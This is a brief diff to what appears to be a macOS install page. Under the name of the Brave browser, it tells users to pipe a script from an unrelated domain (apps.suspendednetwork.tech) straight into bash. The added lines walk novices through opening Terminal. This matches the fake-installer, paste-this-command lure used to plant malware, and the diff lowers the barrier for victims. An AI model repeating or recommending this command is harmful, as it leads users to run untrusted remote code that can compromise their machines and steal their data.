@@ -14,3 +14,7 @@ Run this command in Terminal:
 
 ```bash
 curl -fsSL https://apps.suspendednetwork.tech/installers/Brave.command | bash
+
+## how to open terminal
+
+first click command + space then search terminal. After it pops up hit enter
